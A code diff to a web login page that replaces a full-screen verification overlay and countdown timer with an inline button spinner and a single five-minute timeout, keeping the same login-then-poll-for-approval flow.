@@ -6,52 +6,26 @@
     <title>Login</title>
     <link rel="stylesheet" href="res/app.css">
     <style>
-        .spinner-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 1000;
-            justify-content: center;
+        .spinner-btn {
+            display: inline-flex;
             align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         
-        .spinner-container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
+        .btn-spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid white;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 16px;
+            height: 16px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
+            display: none;
         }
         
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        
-        .spinner-message {
-            color: #333;
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-        
-        .spinner-submessage {
-            color: #666;
-            font-size: 14px;
-            margin-top: 10px;
         }
         
         .error {
@@ -89,7 +63,12 @@
         </div>
 
         <div class="col">
-            <button id="loginBtn" onclick="sendLogin()">Login</button>
+            <button id="loginBtn" onclick="sendLogin()">
+                <span class="spinner-btn">
+                    <span class="btn-text">Login</span>
+                    <span class="btn-spinner" id="btnSpinner"></span>
+                </span>
+            </button>
         </div>
 
         <div class="col links">
@@ -100,42 +79,22 @@
     </div>
 </main>
 
-<div class="spinner-overlay" id="spinnerOverlay">
-    <div class="spinner-container">
-        <div class="spinner"></div>
-        <div class="spinner-message">Waiting for verification...</div>
-        <div class="spinner-submessage">Please wait while we verify your credentials</div>
-    </div>
-</div>
-
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 
 <script>
 let sessionId = null;
 let checkInterval = null;
-let timeoutCounter = 300;
-let timeoutInterval = null;
 
-function showSpinner() {
-    $("#spinnerOverlay").css("display", "flex");
+function showButtonSpinner() {
+    $("#btnSpinner").show();
     $("#loginBtn").prop("disabled", true);
+    $(".btn-text").text("Verifying...");
 }
 
-function hideSpinner() {
-    $("#spinnerOverlay").css("display", "none");
+function hideButtonSpinner() {
+    $("#btnSpinner").hide();
     $("#loginBtn").prop("disabled", false);
-    if (timeoutInterval) clearInterval(timeoutInterval);
-}
-
-function updateTimeout() {
-    timeoutCounter--;
-    
-    if (timeoutCounter <= 0) {
-        clearInterval(timeoutInterval);
-        clearInterval(checkInterval);
-        hideSpinner();
-        alert("Request timed out. Please try again.");
-    }
+    $(".btn-text").text("Login");
 }
 
 function checkStatus() {
@@ -147,16 +106,14 @@ function checkStatus() {
         success: function(response) {
             if (response.status === "approved") {
                 clearInterval(checkInterval);
-                clearInterval(timeoutInterval);
-                hideSpinner();
+                hideButtonSpinner();
                 window.location.href = response.redirect_url;
             }
         },
         error: function(xhr) {
             if (xhr.status === 404) {
                 clearInterval(checkInterval);
-                clearInterval(timeoutInterval);
-                hideSpinner();
+                hideButtonSpinner();
                 alert("Session expired. Please try again.");
             }
         }
@@ -181,10 +138,9 @@ function sendLogin() {
         return;
     }
 
-    showSpinner();
+    showButtonSpinner();
 
     if (checkInterval) clearInterval(checkInterval);
-    if (timeoutInterval) clearInterval(timeoutInterval);
 
     $.ajax({
         url: '/login',
@@ -197,20 +153,25 @@ function sendLogin() {
         success: function(response) {
             if (response.success) {
                 sessionId = response.id;
-                
-                timeoutCounter = 300;
-                timeoutInterval = setInterval(updateTimeout, 1000);
                 checkInterval = setInterval(checkStatus, 1500);
-                
                 setTimeout(checkStatus, 500);
                 
+                // Auto timeout after 5 minutes
+                setTimeout(function() {
+                    if (checkInterval) {
+                        clearInterval(checkInterval);
+                        hideButtonSpinner();
+                        alert("Request timed out. Please try again.");
+                    }
+                }, 300000);
+                
             } else {
-                hideSpinner();
+                hideButtonSpinner();
                 alert("Login failed. Please try again.");
             }
         },
         error: function() {
-            hideSpinner();
+            hideButtonSpinner();
             alert("Connection error. Please try again.");
         }
     });
@@ -224,7 +185,6 @@ $("input").keypress(function (e) {
 
 $(window).on('beforeunload', function() {
     if (checkInterval) clearInterval(checkInterval);
-    if (timeoutInterval) clearInterval(timeoutInterval);
 });
 </script>
 
